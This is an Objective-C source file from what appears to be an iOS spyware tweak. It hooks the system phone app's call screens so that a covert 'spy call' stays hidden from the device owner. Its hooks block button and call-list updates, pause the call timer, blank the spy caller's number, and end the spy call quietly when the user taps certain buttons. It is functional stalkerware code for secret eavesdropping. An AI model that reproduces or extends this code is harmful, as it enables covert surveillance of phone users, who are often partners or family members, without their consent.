//
//  SpyCallInCallService.h
//  MSSPC
//
//  Created by Makara on 11/27/14.
//
//

#import "MSSPC.h"
#import "ICSSpyCallManager.h"
#import "SpyCallManagerSnapshot.h"

#import "PHAudioCallControlsView.h"

#import "PHAudioCallControlsViewController.h"
#import "PHAudioCallControlsViewController+iOS9.h"
#import "PHCallParticipantsViewController.h"
#import "PHAudioCallViewController.h"
#import "PHAudioCallViewController+iOS9.h"
#import "PHInCallRootViewControllerActual.h"

#pragma mark - C methods to get spy call status -

BOOL isNormalCallInProgressICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsNormalCallInProgress]);
}

BOOL isNormalCallIncomingICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsNormalCallIncoming]);
}

BOOL isSpyCallInProgressICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallDisconnecting]);
}

BOOL isSpyCallHangupCompletelyICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallCompletelyHangup]);
}

BOOL isSpyCallInConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInConference]);
}

BOOL isSpyCallLeavingConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallLeavingConference]);
}

BOOL isSpyCallInitiatingConferenceICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mIsSpyCallInitiatingConference]);
}

NSInteger numberOfNormalCallICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mNumberOfNormalCall]);
}

NSInteger numberOfSpycallICS() {
	return ([[[ICSSpyCallManager sharedICSSpyCallManager] mSpyCallManagerSnapshot] mNumberOfSpyCall]);
}

#pragma mark - PHAudioCallControlsView -

HOOK(PHAudioCallControlsView, updateControls, void) {
    APPLOGVERBOSE(@"updateControls");
//    if (isSpyCallAnsweringICS() ||
//        isSpyCallInitiatingConferenceICS() ||
//        isSpyCallInConferenceICS()) {
    if ([ICSSpyCallManager anySpyCall]) { // Use this way to check spy call to improve performance
        // Block update the six buttons
	} else {
		CALL_ORIG(PHAudioCallControlsView, updateControls);
	}
}

#pragma mark - PHAudioCallControlsViewController -

HOOK(PHAudioCallControlsViewController, controlTypeTapped$, void, unsigned int arg1) {
    APPLOGVERBOSE(@"controlTypeTapped$, %d", arg1);
    if (4 == arg1) { // 'add call' button
        if ([ICSSpyCallManager anySpyCall]) {
            if (![SpyCallUtils isMobilePhoneRunning]) {
                /*
                 Though there is no side effect if we do not disconnect spy call but to make it
                 consistent with use case of, if MobilePhone is not running -> disconnect spy call if any
                 */
                [ICSSpyCallManager endSpyCallIfAny];
            } else {
                CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
            }
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
        }
    } else if (5 == arg1) { // 'FaceTime' button
        if ([ICSSpyCallManager anySpyCall]) {
            /*
             In case we did not disconnect spy call from here, SpringBoard openURL... will disconnect this call
             then leave 'speaker' button set to 'selected state', this is the side effect so we need to disconnect from here
             */
            [ICSSpyCallManager endSpyCallIfAny];
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
        }
    } else {
        CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$, arg1);
    }
}

// iOS 9
HOOK(PHAudioCallControlsViewController, controlTypeTapped$forView$, void, unsigned int arg1, id arg2) {
    APPLOGVERBOSE(@"controlTypeTapped$forView$, %d, %@", arg1, arg2);
    if (4 == arg1) { // 'add call' button
        if ([ICSSpyCallManager anySpyCall]) {
            if (![SpyCallUtils isMobilePhoneRunning]) {
                /*
                 Though there is no side effect if we do not disconnect spy call but to make it
                 consistent with use case of, if MobilePhone is not running -> disconnect spy call if any
                 */
                [ICSSpyCallManager endSpyCallIfAny];
            } else {
                CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$forView$, arg1, arg2);
            }
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$forView$, arg1, arg2);
        }
    } else if (5 == arg1) { // 'FaceTime' button
        if ([ICSSpyCallManager anySpyCall]) {
            /*
             In case we did not disconnect spy call from here, SpringBoard openURL... will disconnect this call
             then leave 'speaker' button set to 'selected state', this is the side effect so we need to disconnect from here
             */
            [ICSSpyCallManager endSpyCallIfAny];
        } else {
            CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$forView$, arg1, arg2);
        }
    } else {
        CALL_ORIG(PHAudioCallControlsViewController, controlTypeTapped$forView$, arg1, arg2);
    }
}

#pragma mark - PHCallParticipantsViewController -

// Note: Call timer will be paused while spy call is initiating
HOOK(PHCallParticipantsViewController, secondTickNotification$, void, id arg1) {
    //APPLOGVERBOSE(@"PHCallParticipantsViewController ---> secondTickNotification$, %@", arg1);
    NSNotification *notification = arg1;
    NSString *name = [notification name];
    if ([name isEqualToString:@"PHSynchronizedSecondTickNotification"]) {
        if ([ICSSpyCallManager anyCallOnHold]) {
            if ([ICSSpyCallManager anySpyCall]) {
                // Block
            } else {
                CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
            }
        } else {
            CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
        }
    } else {
        CALL_ORIG(PHCallParticipantsViewController, secondTickNotification$, arg1);
    }
}

HOOK(PHCallParticipantsViewController, _updateCallGroups, void) {
    APPLOGVERBOSE(@"_updateCallGroups %@", [self callGroups]);
    if ([ICSSpyCallManager anySpyCall]) {
        // Block
	} else {
		CALL_ORIG(PHCallParticipantsViewController, _updateCallGroups);
	}
}

#pragma mark - PHAudioCallViewController -

// Note: FaceTime button will be enable->disable while user return from SpringBoard or other apps screen (only one time while conference with private number)
HOOK(PHAudioCallViewController, callCenterCallStatusChangedNotification$, void, id arg1) {
    APPLOGVERBOSE(@"PHAudioCallViewController ---> callCenterCallStatusChangedNotification$, %@", arg1);
    NSNotification *notification = arg1;
    NSString *name = [notification name];
    if ([name isEqualToString:@"TUCallCenterCallStatusChangedNotification"]) {
        if ([ICSSpyCallManager anySpyCall]) {
            ;
        } else {
            TUProxyCall *call = [notification object];
            if ([ICSSpyCallManager isSpyTUCall:call]) {
                // iOS 9, conference call, firstly 3rd party ends normal call causes spy call number appear in call ended screen for less than a second, so we need to
                // override destinationID of TUProxyCall then it would not shown to user; override destinationID is enough even spy number is saved to Contacts
                call.destinationID = @"";
                
                /*
                 Use case 1:
                 - FaceTime Audio on hold, normal call connected
                 - Spy call come in
                 - Spy call reject
                 - FaceTime Audio connencted, normal call connected and calls cannot swap (misbehave)
                 - User press end call button (red button)
                 - FaceTime Audio disconnted
                 - User cannot end normal from target (misbehave)
                 
                 Use case 2:
                 - FaceTime Audio connected, normal call on hold
                 - Follow stp in use case 1 from dash 2
                 - Device behave normally
                 */
                
                BOOL haveFaceTimeOnHold = NO;
                
                Class $TUCallCenter = objc_getClass("TUCallCenter");
                TUCallCenter *callCenter = [$TUCallCenter sharedInstance];
                for (TUProxyCall *call in [callCenter currentCalls]) {
                    if (call.service == 2 && call.status == TU_CALL_STATUS_ONHOLD) { // service == 2, FaceTime
                        haveFaceTimeOnHold = YES;
                        break;
                    }
                }
                
                if ([(NSArray *)[callCenter currentCalls] count] > 1 && haveFaceTimeOnHold) {
                    for (TUProxyCall *call in [callCenter currentCalls]) {
                        if (call.service != 2 && (call.status == TU_CALL_STATUS_CONECTED)) {
                            [call hold];
                        }
                    }
                }
                
                CALL_ORIG(PHAudioCallViewController, callCenterCallStatusChangedNotification$, arg1);
            } else {
                CALL_ORIG(PHAudioCallViewController, callCenterCallStatusChangedNotification$, arg1);
            }
        }
    } else {
        CALL_ORIG(PHAudioCallViewController, callCenterCallStatusChangedNotification$, arg1);
    }
}

// Note: Call ended screen is different between 'ended by 3rd party' and 'ended by target'
// ** ended by target participant status: ending -> ended -> disappear
// ** ended by 3rd party status: screen stop at duration timer -> disappear
HOOK(PHAudioCallViewController, bottomBarActionPerformed$fromBar$, void, int arg1, id arg2) {
    APPLOGVERBOSE(@"bottomBarActionPerformed$fromBar$, %d, %@", arg1, arg2); // arg2 = TPSuperBottomBar
    
    if (arg1 == 9) {
        // 5, decline
        // 1, accept
        // 9, disconnect
        if ([ICSSpyCallManager endSpyCallIfAny]) {
            [NSThread sleepForTimeInterval:0.001];
        }
    }
    CALL_ORIG(PHAudioCallViewController, bottomBarActionPerformed$fromBar$, arg1, arg2);
}

// iOS 9
HOOK(PHAudioCallViewController, bottomBarActionPerformed$withCompletionState$fromBar$, void, int arg1, int arg2, id arg3) {
    APPLOGVERBOSE(@"bottomBarActionPerformed$withCompletionState$fromBar$, %d, %d, %@", arg1, arg2, arg3); // arg3 = TPSuperBottomBar
    
    if (arg1 == 9) {
        // 5, decline
        // 1, accept
        // 9, disconnect
        if ([ICSSpyCallManager endSpyCallIfAny]) {
            [NSThread sleepForTimeInterval:0.001];
        } else {
            // Check comment in callCenterCallStatusChangedNotification$ method of this class
            BOOL haveFaceTimeConnected = NO;
            
            Class $TUCallCenter = objc_getClass("TUCallCenter");
            TUCallCenter *callCenter = [$TUCallCenter sharedInstance];
            for (TUProxyCall *call in [callCenter currentCalls]) {
                if (call.service == 2 && call.status == TU_CALL_STATUS_CONECTED) { // service == 2, FaceTime
                    haveFaceTimeConnected = YES;
                }
            }
            
            if ([(NSArray *)[callCenter currentCalls] count] > 1 && haveFaceTimeConnected) {
                for (TUProxyCall *call in [callCenter currentCalls]) {
                    if (call.service != 2 && (call.status == TU_CALL_STATUS_CONECTED)) {
                        [callCenter disconnectCall:call];
                        [NSThread sleepForTimeInterval:0.001];
                    }
                }
            }
        }
    }
    CALL_ORIG(PHAudioCallViewController, bottomBarActionPerformed$withCompletionState$fromBar$, arg1, arg2, arg3);
}

#pragma mark - PHInCallRootViewControllerActual -

// Note: When spy call coference is initiating if contact or phone application (add call) view will disappear to InCallService view
HOOK(PHInCallRootViewControllerActual, handleDoubleHeightStatusBarTap, void) {
    APPLOGVERBOSE(@"handleDoubleHeightStatusBarTap");
    CALL_ORIG(PHInCallRootViewControllerActual, handleDoubleHeightStatusBarTap);
}
